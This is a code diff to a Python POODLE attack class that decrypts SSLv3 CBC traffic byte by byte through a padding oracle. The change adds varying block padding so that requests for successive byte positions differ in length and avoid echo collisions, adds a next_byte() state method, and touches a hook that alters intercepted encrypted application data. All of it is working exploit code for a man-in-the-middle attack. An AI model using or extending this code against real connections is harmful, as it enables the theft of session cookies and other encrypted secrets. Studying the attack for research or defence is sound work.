@@ -48,6 +48,10 @@ class PoodleAttack:
         # is the last byte of a block.
         length_url = oracle.block_size - (len(start_data) + byte_index + 1) % oracle.block_size
 
+        # We add padding so that requests for different byte position have different length
+        # This way we don't have collision with echo of previous byte decryption.
+        length_url += attack_state.block_padding * oracle.block_size
+
         # Here we are calculating the length of the POST data so that padding requires
         # block_size bytes.
         length_post_data = oracle.block_size - (oracle.base_length + length_url) % oracle.block_size
@@ -62,6 +66,7 @@ class PoodleAttack:
 
         self.byte_position = len(start_data) + length_url + byte_index + 1
         self.byte_block = int(self.byte_position / oracle.block_size) - 1
+
         def alter_application_data(connection, structure, state, source):
             # We select the block
             block_ciphered = structure.body.encrypted_data
@@ -96,6 +101,7 @@ class PoodleAttack:
             guess = attack_state.current_guest
 
             attack_state.reset()
+            attack_state.next_byte()
 
             try:
                 callback(guess, byte_index)
@@ -170,6 +176,7 @@ class PoodleAttackState:
         self.force_request_oracle = force_request_oracle
         self.wait_thread = None
         self.mutex = threading.Lock()
+        self.block_padding = 0
 
         self.reset()
 
@@ -183,3 +190,6 @@ class PoodleAttackState:
         self.current_guest = None
         self.current_byte = None
         self.current_alert = 0
+
+    def next_byte(self):
+        self.block_padding = (self.block_padding + 2) % 5
